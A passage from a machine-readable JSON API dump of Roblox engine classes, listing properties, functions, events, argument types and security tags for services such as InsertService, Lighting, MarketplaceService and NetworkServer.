null}],"Name":"SetAssetVersionUrl","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"baseSetsUrl","Default":null}],"Name":"SetBaseCategoryUrl","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"baseSetsUrl","Default":null}],"Name":"SetBaseSetsUrl","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"collectionUrl","Default":null}],"Name":"SetCollectionUrl","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"freeDecalUrl","Default":null}],"Name":"SetFreeDecalUrl","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"freeModelUrl","Default":null}],"Name":"SetFreeModelUrl","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"trustLevel","Default":null}],"Name":"SetTrustLevel","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"userSetsUrl","Default":null}],"Name":"SetUserCategoryUrl","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"userSetsUrl","Default":null}],"Name":"SetUserSetsUrl","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetBaseCategories","tags":["deprecated"],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Array","Arguments":[],"Name":"GetBaseSets","tags":[],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Array","Arguments":[{"Type":"int","Name":"categoryId","Default":null}],"Name":"GetCollection","tags":[],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Array","Arguments":[{"Type":"string","Name":"searchText","Default":null},{"Type":"int","Name":"pageNum","Default":null}],"Name":"GetFreeDecals","tags":[],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Array","Arguments":[{"Type":"string","Name":"searchText","Default":null},{"Type":"int","Name":"pageNum","Default":null}],"Name":"GetFreeModels","tags":[],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"int","Arguments":[{"Type":"int","Name":"assetId","Default":null}],"Name":"GetLatestAssetVersionAsync","tags":[],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Array","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetUserCategories","tags":["deprecated"],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Array","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetUserSets","tags":[],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"assetId","Default":null}],"Name":"LoadAsset","tags":[],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"assetVersionId","Default":null}],"Name":"LoadAssetVersion","tags":[],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"assetId","Default":null}],"Name":"loadAsset","tags":["deprecated"],"Class":"InsertService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"InstancePacketCache","tags":[]},{"Superclass":"Instance","type":"Class","Name":"IntConstrainedValue","tags":[]},{"ValueType":"int","type":"Property","Name":"ConstrainedValue","tags":["hidden"],"Class":"IntConstrainedValue"},{"ValueType":"int","type":"Property","Name":"MaxValue","tags":[],"Class":"IntConstrainedValue"},{"ValueType":"int","type":"Property","Name":"MinValue","tags":[],"Class":"IntConstrainedValue"},{"ValueType":"int","type":"Property","Name":"Value","tags":[],"Class":"IntConstrainedValue"},{"Arguments":[{"Name":"value","Type":"int"}],"Name":"Changed","tags":[],"Class":"IntConstrainedValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"int"}],"Name":"changed","tags":["deprecated"],"Class":"IntConstrainedValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"IntValue","tags":[]},{"ValueType":"int","type":"Property","Name":"Value","tags":[],"Class":"IntValue"},{"Arguments":[{"Name":"value","Type":"int"}],"Name":"Changed","tags":[],"Class":"IntValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"int"}],"Name":"changed","tags":["deprecated"],"Class":"IntValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"JointInstance","tags":[]},{"ValueType":"CoordinateFrame","type":"Property","Name":"C0","tags":[],"Class":"JointInstance"},{"ValueType":"CoordinateFrame","type":"Property","Name":"C1","tags":[],"Class":"JointInstance"},{"ValueType":"Object","type":"Property","Name":"Part0","tags":[],"Class":"JointInstance"},{"ValueType":"Object","type":"Property","Name":"Part1","tags":[],"Class":"JointInstance"},{"ValueType":"Object","type":"Property","Name":"part1","tags":["deprecated","hidden"],"Class":"JointInstance"},{"Superclass":"JointInstance","type":"Class","Name":"DynamicRotate","tags":[]},{"ValueType":"float","type":"Property","Name":"BaseAngle","tags":[],"Class":"DynamicRotate"},{"Superclass":"DynamicRotate","type":"Class","Name":"RotateP","tags":[]},{"Superclass":"DynamicRotate","type":"Class","Name":"RotateV","tags":[]},{"Superclass":"JointInstance","type":"Class","Name":"Glue","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"F0","tags":[],"Class":"Glue"},{"ValueType":"Vector3","type":"Property","Name":"F1","tags":[],"Class":"Glue"},{"ValueType":"Vector3","type":"Property","Name":"F2","tags":[],"Class":"Glue"},{"ValueType":"Vector3","type":"Property","Name":"F3","tags":[],"Class":"Glue"},{"Superclass":"JointInstance","type":"Class","Name":"ManualSurfaceJointInstance","tags":[]},{"Superclass":"ManualSurfaceJointInstance","type":"Class","Name":"ManualGlue","tags":[]},{"Superclass":"ManualSurfaceJointInstance","type":"Class","Name":"ManualWeld","tags":[]},{"Superclass":"JointInstance","type":"Class","Name":"Motor","tags":[]},{"ValueType":"float","type":"Property","Name":"CurrentAngle","tags":[],"Class":"Motor"},{"ValueType":"float","type":"Property","Name":"DesiredAngle","tags":[],"Class":"Motor"},{"ValueType":"float","type":"Property","Name":"MaxVelocity","tags":[],"Class":"Motor"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"value","Default":null}],"Name":"SetDesiredAngle","tags":[],"Class":"Motor","type":"Function"},{"Superclass":"Motor","type":"Class","Name":"Motor6D","tags":[]},{"Superclass":"JointInstance","type":"Class","Name":"Rotate","tags":[]},{"Superclass":"JointInstance","type":"Class","Name":"Snap","tags":[]},{"Superclass":"JointInstance","type":"Class","Name":"VelocityMotor","tags":[]},{"ValueType":"float","type":"Property","Name":"CurrentAngle","tags":[],"Class":"VelocityMotor"},{"ValueType":"float","type":"Property","Name":"DesiredAngle","tags":[],"Class":"VelocityMotor"},{"ValueType":"Object","type":"Property","Name":"Hole","tags":[],"Class":"VelocityMotor"},{"ValueType":"float","type":"Property","Name":"MaxVelocity","tags":[],"Class":"VelocityMotor"},{"Superclass":"JointInstance","type":"Class","Name":"Weld","tags":[]},{"Superclass":"Instance","type":"Class","Name":"JointsService","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[],"Name":"ClearJoinAfterMoveJoints","tags":[],"Class":"JointsService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"CreateJoinAfterMoveJoints","tags":[],"Class":"JointsService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"joinInstance","Default":null}],"Name":"SetJoinAfterMoveInstance","tags":[],"Class":"JointsService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"joinTarget","Default":null}],"Name":"SetJoinAfterMoveTarget","tags":[],"Class":"JointsService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ShowPermissibleJoints","tags":[],"Class":"JointsService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Keyframe","tags":[]},{"ValueType":"float","type":"Property","Name":"Time","tags":[],"Class":"Keyframe"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"pose","Default":null}],"Name":"AddPose","tags":[],"Class":"Keyframe","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetPoses","tags":[],"Class":"Keyframe","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"pose","Default":null}],"Name":"RemovePose","tags":[],"Class":"Keyframe","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"KeyframeSequence","tags":[]},{"ValueType":"bool","type":"Property","Name":"Loop","tags":[],"Class":"KeyframeSequence"},{"ValueType":"AnimationPriority","type":"Property","Name":"Priority","tags":[],"Class":"KeyframeSequence"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"keyframe","Default":null}],"Name":"AddKeyframe","tags":[],"Class":"KeyframeSequence","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetKeyframes","tags":[],"Class":"KeyframeSequence","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"keyframe","Default":null}],"Name":"RemoveKeyframe","tags":[],"Class":"KeyframeSequence","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"KeyframeSequenceProvider","tags":[]},{"ReturnType":"Instance","Arguments":[{"Type":"Content","Name":"assetId","Default":null}],"Name":"GetKeyframeSequence","tags":[],"Class":"KeyframeSequenceProvider","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"assetId","Default":null},{"Type":"bool","Name":"useCache","Default":null}],"Name":"GetKeyframeSequenceById","tags":[],"Class":"KeyframeSequenceProvider","type":"Function"},{"ReturnType":"Content","Arguments":[{"Type":"Instance","Name":"keyframeSequence","Default":null}],"Name":"RegisterActiveKeyframeSequence","tags":[],"Class":"KeyframeSequenceProvider","type":"Function"},{"ReturnType":"Content","Arguments":[{"Type":"Instance","Name":"keyframeSequence","Default":null}],"Name":"RegisterKeyframeSequence","tags":[],"Class":"KeyframeSequenceProvider","type":"Function"},{"ReturnType":"Dictionary","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"int","Name":"page","Default":"1"}],"Name":"GetAnimations","tags":[],"Class":"KeyframeSequenceProvider","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"Light","tags":[]},{"ValueType":"float","type":"Property","Name":"Brightness","tags":[],"Class":"Light"},{"ValueType":"Color3","type":"Property","Name":"Color","tags":[],"Class":"Light"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"Light"},{"ValueType":"bool","type":"Property","Name":"Shadows","tags":[],"Class":"Light"},{"Superclass":"Light","type":"Class","Name":"PointLight","tags":[]},{"ValueType":"float","type":"Property","Name":"Range","tags":[],"Class":"PointLight"},{"Superclass":"Light","type":"Class","Name":"SpotLight","tags":[]},{"ValueType":"float","type":"Property","Name":"Angle","tags":[],"Class":"SpotLight"},{"ValueType":"NormalId","type":"Property","Name":"Face","tags":[],"Class":"SpotLight"},{"ValueType":"float","type":"Property","Name":"Range","tags":[],"Class":"SpotLight"},{"Superclass":"Light","type":"Class","Name":"SurfaceLight","tags":[]},{"ValueType":"float","type":"Property","Name":"Angle","tags":[],"Class":"SurfaceLight"},{"ValueType":"NormalId","type":"Property","Name":"Face","tags":[],"Class":"SurfaceLight"},{"ValueType":"float","type":"Property","Name":"Range","tags":[],"Class":"SurfaceLight"},{"Superclass":"Instance","type":"Class","Name":"Lighting","tags":["notCreatable"]},{"ValueType":"Color3","type":"Property","Name":"Ambient","tags":[],"Class":"Lighting"},{"ValueType":"float","type":"Property","Name":"Brightness","tags":[],"Class":"Lighting"},{"ValueType":"Color3","type":"Property","Name":"ColorShift_Bottom","tags":[],"Class":"Lighting"},{"ValueType":"Color3","type":"Property","Name":"ColorShift_Top","tags":[],"Class":"Lighting"},{"ValueType":"Color3","type":"Property","Name":"FogColor","tags":[],"Class":"Lighting"},{"ValueType":"float","type":"Property","Name":"FogEnd","tags":[],"Class":"Lighting"},{"ValueType":"float","type":"Property","Name":"FogStart","tags":[],"Class":"Lighting"},{"ValueType":"float","type":"Property","Name":"GeographicLatitude","tags":[],"Class":"Lighting"},{"ValueType":"bool","type":"Property","Name":"GlobalShadows","tags":[],"Class":"Lighting"},{"ValueType":"Color3","type":"Property","Name":"OutdoorAmbient","tags":[],"Class":"Lighting"},{"ValueType":"bool","type":"Property","Name":"Outlines","tags":[],"Class":"Lighting"},{"ValueType":"Color3","type":"Property","Name":"ShadowColor","tags":[],"Class":"Lighting"},{"ValueType":"string","type":"Property","Name":"TimeOfDay","tags":[],"Class":"Lighting"},{"ReturnType":"double","Arguments":[],"Name":"GetMinutesAfterMidnight","tags":[],"Class":"Lighting","type":"Function"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetMoonDirection","tags":[],"Class":"Lighting","type":"Function"},{"ReturnType":"float","Arguments":[],"Name":"GetMoonPhase","tags":[],"Class":"Lighting","type":"Function"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetSunDirection","tags":[],"Class":"Lighting","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"double","Name":"minutes","Default":null}],"Name":"SetMinutesAfterMidnight","tags":[],"Class":"Lighting","type":"Function"},{"ReturnType":"double","Arguments":[],"Name":"getMinutesAfterMidnight","tags":["deprecated"],"Class":"Lighting","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"double","Name":"minutes","Default":null}],"Name":"setMinutesAfterMidnight","tags":["deprecated"],"Class":"Lighting","type":"Function"},{"Arguments":[{"Name":"skyboxChanged","Type":"bool"}],"Name":"LightingChanged","tags":[],"Class":"Lighting","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"LocalWorkspace","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"LogService","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"source","Default":null}],"Name":"ExecuteScript","tags":["RobloxScriptSecurity"],"Class":"LogService","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetLogHistory","tags":[],"Class":"LogService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"RequestServerOutput","tags":["RobloxScriptSecurity"],"Class":"LogService","type":"Function"},{"Arguments":[{"Name":"message","Type":"string"},{"Name":"messageType","Type":"MessageType"}],"Name":"MessageOut","tags":[],"Class":"LogService","type":"Event"},{"Arguments":[{"Name":"message","Type":"string"},{"Name":"messageType","Type":"MessageType"},{"Name":"timestamp","Type":"int"}],"Name":"ServerMessageOut","tags":["RobloxScriptSecurity"],"Class":"LogService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"LoginService","tags":[]},{"ReturnType":"void","Arguments":[],"Name":"Logout","tags":["RobloxSecurity"],"Class":"LoginService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"PromptLogin","tags":["RobloxSecurity"],"Class":"LoginService","type":"Function"},{"Arguments":[{"Name":"loginError","Type":"string"}],"Name":"LoginFailed","tags":["RobloxSecurity"],"Class":"LoginService","type":"Event"},{"Arguments":[{"Name":"username","Type":"string"}],"Name":"LoginSucceeded","tags":["RobloxSecurity"],"Class":"LoginService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"LuaSettings","tags":[]},{"ValueType":"bool","type":"Property","Name":"AreScriptStartsReported","tags":[],"Class":"LuaSettings"},{"ValueType":"double","type":"Property","Name":"DefaultWaitTime","tags":[],"Class":"LuaSettings"},{"ValueType":"int","type":"Property","Name":"GcFrequency","tags":[],"Class":"LuaSettings"},{"ValueType":"int","type":"Property","Name":"GcLimit","tags":[],"Class":"LuaSettings"},{"ValueType":"int","type":"Property","Name":"GcPause","tags":[],"Class":"LuaSettings"},{"ValueType":"int","type":"Property","Name":"GcStepMul","tags":[],"Class":"LuaSettings"},{"ValueType":"float","type":"Property","Name":"WaitingThreadsBudget","tags":[],"Class":"LuaSettings"},{"Superclass":"Instance","type":"Class","Name":"LuaSourceContainer","tags":[]},{"Superclass":"LuaSourceContainer","type":"Class","Name":"BaseScript","tags":[]},{"ValueType":"bool","type":"Property","Name":"Disabled","tags":[],"Class":"BaseScript"},{"ValueType":"Content","type":"Property","Name":"LinkedSource","tags":[],"Class":"BaseScript"},{"Superclass":"BaseScript","type":"Class","Name":"CoreScript","tags":["notCreatable"]},{"Superclass":"BaseScript","type":"Class","Name":"Script","tags":[]},{"ValueType":"ProtectedString","type":"Property","Name":"Source","tags":["PluginSecurity"],"Class":"Script"},{"ReturnType":"string","Arguments":[],"Name":"GetHash","tags":["RobloxPlaceSecurity"],"Class":"Script","type":"Function"},{"Superclass":"Script","type":"Class","Name":"LocalScript","tags":[]},{"Superclass":"LuaSourceContainer","type":"Class","Name":"ModuleScript","tags":[]},{"ValueType":"Content","type":"Property","Name":"LinkedSource","tags":[],"Class":"ModuleScript"},{"ValueType":"ProtectedString","type":"Property","Name":"Source","tags":["PluginSecurity"],"Class":"ModuleScript"},{"Superclass":"Instance","type":"Class","Name":"LuaWebService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"MarketplaceService","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"string","Name":"productId","Default":null}],"Name":"PromptNativePurchase","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"int","Name":"productId","Default":null},{"Type":"bool","Name":"equipIfPurchased","Default":"true"},{"Type":"CurrencyType","Name":"currencyType","Default":"Default"}],"Name":"PromptProductPurchase","tags":[],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"int","Name":"assetId","Default":null},{"Type":"bool","Name":"equipIfPurchased","Default":"true"},{"Type":"CurrencyType","Name":"currencyType","Default":"Default"}],"Name":"PromptPurchase","tags":[],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"string","Name":"productId","Default":null}],"Name":"PromptThirdPartyPurchase","tags":["RobloxPlaceSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"assetId","Default":null},{"Type":"int","Name":"robuxAmount","Default":null}],"Name":"ReportAssetSale","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ReportRobuxUpsellStarted","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"ticket","Default":null},{"Type":"int","Name":"playerId","Default":null},{"Type":"int","Name":"productId","Default":null}],"Name":"SignalClientPurchaseSuccess","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"int","Name":"productId","Default":null},{"Type":"bool","Name":"success","Default":null}],"Name":"SignalPromptProductPurchaseFinished","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"int","Name":"assetId","Default":null},{"Type":"bool","Name":"success","Default":null}],"Name":"SignalPromptPurchaseFinished","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"value","Default":null}],"Name":"SignalServerLuaDialogClosed","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetDeveloperProductsAsync","tags":[],"Class":"MarketplaceService","type":"YieldFunction"},{"ReturnType":"Dictionary","Arguments":[{"Type":"int","Name":"assetId","Default":null},{"Type":"InfoType","Name":"infoType","Default":"Asset"}],"Name":"GetProductInfo","tags":[],"Class":"MarketplaceService","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"int","Name":"assetId","Default":null}],"Name":"PlayerOwnsAsset","tags":[],"Class":"MarketplaceService","type":"YieldFunction"},{"Arguments":[{"Name":"arguments","Type":"Tuple"}],"Name":"ClientLuaDialogRequested","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"ticket","Type":"string"},{"Name":"playerId","Type":"int"},{"Name":"productId","Type":"int"}],"Name":"ClientPurchaseSuccess","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"productId","Type":"string"},{"Name":"wasPurchased","Type":"bool"}],"Name":"NativePurchaseFinished","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"userId","Type":"int"},{"Name":"productId","Type":"int"},{"Name":"isPurchased","Type":"bool"}],"Name":"PromptProductPurchaseFinished","tags":["deprecated"],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"productId","Type":"int"},{"Name":"equipIfPurchased","Type":"bool"},{"Name":"currencyType","Type":"CurrencyType"}],"Name":"PromptProductPurchaseRequested","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"assetId","Type":"int"},{"Name":"isPurchased","Type":"bool"}],"Name":"PromptPurchaseFinished","tags":[],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"assetId","Type":"int"},{"Name":"equipIfPurchased","Type":"bool"},{"Name":"currencyType","Type":"CurrencyType"}],"Name":"PromptPurchaseRequested","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"serverResponseTable","Type":"Dictionary"}],"Name":"ServerPurchaseVerification","tags":["RobloxScriptSecurity"],"Class":"MarketplaceService","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"productId","Type":"string"},{"Name":"receipt","Type":"string"},{"Name":"wasPurchased","Type":"bool"}],"Name":"ThirdPartyPurchaseFinished","tags":["RobloxPlaceSecurity"],"Class":"MarketplaceService","type":"Event"},{"ReturnType":"ProductPurchaseDecision","Arguments":[{"Name":"receiptInfo","Type":"Dictionary"}],"Name":"ProcessReceipt","tags":[],"Class":"MarketplaceService","type":"Callback"},{"Superclass":"Instance","type":"Class","Name":"Message","tags":["deprecated"]},{"ValueType":"string","type":"Property","Name":"Text","tags":[],"Class":"Message"},{"Superclass":"Message","type":"Class","Name":"Hint","tags":["deprecated"]},{"Superclass":"Instance","type":"Class","Name":"Mouse","tags":[]},{"ValueType":"CoordinateFrame","type":"Property","Name":"Hit","tags":["readonly"],"Class":"Mouse"},{"ValueType":"Content","type":"Property","Name":"Icon","tags":[],"Class":"Mouse"},{"ValueType":"CoordinateFrame","type":"Property","Name":"Origin","tags":["readonly"],"Class":"Mouse"},{"ValueType":"Object","type":"Property","Name":"Target","tags":["readonly"],"Class":"Mouse"},{"ValueType":"Object","type":"Property","Name":"TargetFilter","tags":[],"Class":"Mouse"},{"ValueType":"NormalId","type":"Property","Name":"TargetSurface","tags":["readonly"],"Class":"Mouse"},{"ValueType":"Ray","type":"Property","Name":"UnitRay","tags":["readonly"],"Class":"Mouse"},{"ValueType":"int","type":"Property","Name":"ViewSizeX","tags":["readonly"],"Class":"Mouse"},{"ValueType":"int","type":"Property","Name":"ViewSizeY","tags":["readonly"],"Class":"Mouse"},{"ValueType":"int","type":"Property","Name":"X","tags":["readonly"],"Class":"Mouse"},{"ValueType":"int","type":"Property","Name":"Y","tags":["readonly"],"Class":"Mouse"},{"ValueType":"CoordinateFrame","type":"Property","Name":"hit","tags":["deprecated","hidden","readonly"],"Class":"Mouse"},{"ValueType":"Object","type":"Property","Name":"target","tags":["deprecated","readonly"],"Class":"Mouse"},{"Arguments":[],"Name":"Button1Down","tags":[],"Class":"Mouse","type":"Event"},{"Arguments":[],"Name":"Button1Up","tags":[],"Class":"Mouse","type":"Event"},{"Arguments":[],"Name":"Button2Down","tags":[],"Class":"Mouse","type":"Event"},{"Arguments":[],"Name":"Button2Up","tags":[],"Class":"Mouse","type":"Event"},{"Arguments":[],"Name":"Idle","tags":[],"Class":"Mouse","type":"Event"},{"Arguments":[{"Name":"key","Type":"string"}],"Name":"KeyDown","tags":["deprecated"],"Class":"Mouse","type":"Event"},{"Arguments":[{"Name":"key","Type":"string"}],"Name":"KeyUp","tags":["deprecated"],"Class":"Mouse","type":"Event"},{"Arguments":[],"Name":"Move","tags":[],"Class":"Mouse","type":"Event"},{"Arguments":[],"Name":"WheelBackward","tags":[],"Class":"Mouse","type":"Event"},{"Arguments":[],"Name":"WheelForward","tags":[],"Class":"Mouse","type":"Event"},{"Arguments":[{"Name":"key","Type":"string"}],"Name":"keyDown","tags":["deprecated"],"Class":"Mouse","type":"Event"},{"Superclass":"Mouse","type":"Class","Name":"PlayerMouse","tags":[]},{"Superclass":"Mouse","type":"Class","Name":"PluginMouse","tags":[]},{"Arguments":[{"Name":"instances","Type":"Objects"}],"Name":"DragEnter","tags":["PluginSecurity"],"Class":"PluginMouse","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"NetworkMarker","tags":["notbrowsable"]},{"Arguments":[],"Name":"Received","tags":[],"Class":"NetworkMarker","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"NetworkPeer","tags":["notbrowsable"]},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"limit","Default":null}],"Name":"SetOutgoingKBPSLimit","tags":["PluginSecurity"],"Class":"NetworkPeer","type":"Function"},{"Superclass":"NetworkPeer","type":"Class","Name":"NetworkClient","tags":["notCreatable"]},{"ValueType":"string","type":"Property","Name":"Ticket","tags":[],"Class":"NetworkClient"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"blockDuration","Default":"3000"}],"Name":"Disconnect","tags":["LocalUserSecurity"],"Class":"NetworkClient","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"string","Name":"server","Default":null},{"Type":"int","Name":"serverPort","Default":null},{"Type":"int","Name":"clientPort","Default":"0"},{"Type":"int","Name":"threadSleepTime","Default":"30"}],"Name":"PlayerConnect","tags":["PluginSecurity"],"Class":"NetworkClient","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"gameSessionID","Default":null}],"Name":"SetGameSessionID","tags":["RobloxSecurity"],"Class":"NetworkClient","type":"Function"},{"Arguments":[{"Name":"peer","Type":"string"},{"Name":"replicator","Type":"Instance"}],"Name":"ConnectionAccepted","tags":[],"Class":"NetworkClient","type":"Event"},{"Arguments":[{"Name":"peer","Type":"string"},{"Name":"code","Type":"int"},{"Name":"reason","Type":"string"}],"Name":"ConnectionFailed","tags":[],"Class":"NetworkClient","type":"Event"},{"Arguments":[{"Name":"peer","Type":"string"}],"Name":"ConnectionRejected","tags":[],"Class":"NetworkClient","type":"Event"},{"Superclass":"NetworkPeer","type":"Class","Name":"NetworkServer","tags":["notCreatable"]},{"ValueType":"int","type":"Property","Name":"Port","tags":["readonly"],"Class":"NetworkServer"},{"ReturnType":"void","Arguments":[],"Name":"ConfigureAsCloudEditServer","tags":["RobloxSecurity"],"Class":"NetworkServer","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ConfigureAsTeamTestServer","tags":["RobloxSecurity"],"Class":"NetworkServer","type":"Function"},{"ReturnType":"int","Arguments":[],"Name":"GetClientCount","tags":["LocalUserSecurity"],"Class":"NetworkServer","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"value","Default":null}],"Name":"SetIsPlayerAuthenticationRequired","tags":["RobloxSecurity"],"Class":"NetworkServer","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"port","Default":"0"},{"Type":"int","Name":"threadSleepTime","Default":"20"}],"Name":"Start","tags":["PluginSecurity"],"Class":"NetworkServer","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"blockDuration","Default":"1000"}],"Name":"Stop","tags":["LocalUserSecurity"],"Class":"NetworkServer","type":"Function"},{"Arguments":[{"Name":"peer","Type":"Instance"},{"Name":"result","Type":"FilterResult"},{"Name":"instance","Type":"Instance"},{"Name":"member","Type":"string"}],"Name":"DataBasicFiltered","tags":["LocalUserSecurity"],"Class":"NetworkServer","type":"Event"},{"Arguments":[{"Name":"peer","Type":"Instance"},{"Name":"result","Type":"FilterResult"},{"Name":"instance","Type":"Instance"},{"Name":"member","Type":"string"}],"Name":"DataCustomFiltered","tags":["LocalUserSecurity"],"Class":"NetworkServer","type":"Event"},{"Arguments":[{"Name":"peer","Type":"string"},{"Name":"replicator","Type":"Instance"}],"Name":"IncommingConnection","tags":["RobloxScriptSecurity"],"Class":"NetworkServer","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"NetworkReplicator","tags":["notCreatable"]},{"ValueType":"string","type":"Property","Name":"MachineAddress","tags":["LocalUserSecurity","readonly"],"Class":"NetworkReplicator"},{"ValueType":"int","type":"Property","Name":"Port","tags":["LocalUserSecurity","readonly"],"Class":"NetworkReplicator"},{"ReturnType":"void","Arguments":[],"Name":"CloseConnection","tags":["LocalUserSecurity"],"Class":"NetworkReplicator","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"DisableProcessPackets","tags":["LocalUserSecurity"],"Class":"NetworkReplicator","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"EnableProcessPackets","tags":["LocalUserSecurity"],"Class":"NetworkReplicator","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetPlayer","tags":[],"Class":"NetworkReplicator","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"verbosityLevel","Default":"0"}],"Name":"GetRakStatsString","tags":["PluginSecurity"